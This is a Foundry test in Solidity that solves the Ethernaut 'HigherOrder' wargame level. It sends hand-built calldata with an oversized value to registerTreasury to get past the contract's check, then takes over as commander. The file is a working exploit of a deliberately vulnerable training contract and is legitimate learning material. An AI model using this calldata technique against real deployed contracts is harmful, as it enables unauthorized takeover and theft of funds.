// SPDX-License-Identifier: MIT
pragma experimental ABIEncoderV2;
pragma solidity 0.6.12;

import "forge-std/Test.sol";
import "src/openzeppelin-ethernaut/HigherOrder.sol";

contract HigherOrderTest is Test {
    HigherOrder instance;

    function setUp() public {
        instance = new HigherOrder();
    }

    function test() public {
        assertEq(instance.commander(), address(0));

        bytes memory data = abi.encodeWithSelector(
            HigherOrder.registerTreasury.selector,
            uint256(-1)
        );

        (bool success, ) = address(instance).call(data);
        assertTrue(success);

        instance.claimLeadership();
        assertEq(instance.commander(), address(this));
    }
}
